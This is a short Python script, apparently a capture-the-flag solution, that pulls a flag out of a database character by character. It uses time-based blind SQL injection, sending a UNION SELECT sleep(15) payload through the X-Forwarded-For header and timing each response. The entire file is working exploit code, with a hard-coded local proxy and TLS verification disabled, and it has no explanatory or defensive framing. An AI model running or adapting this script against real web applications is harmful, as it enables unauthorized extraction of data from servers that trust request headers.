import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}



def sqli_flag(url):
    flag = ""
    for i in range(1,44):
        for j in range(48,126):
            char = chr(j)
            sqli_payload = "' UNION SELECT sleep(15),null,null FROM flag WHERE substring(flag,%s,1) = '%s';-- -" %(i,char)
            headers = {"X-Forwarded-for": f"127.0.0.1{sqli_payload}"}
            r = requests.get(url, proxies=proxies, headers=headers, verify=False)
            if int(r.elapsed.total_seconds()) >= 15:
                flag += chr(j)
                sys.stdout.write('\r' + flag)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + flag + chr(j))
                sys.stdout.flush()
 


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s url" %sys.argv[0])
        print("[+] Exameple: %s http://www.example.com/" %sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("Extracting the flag...")
    sqli_flag(url)

if __name__ == "__main__":
    main()
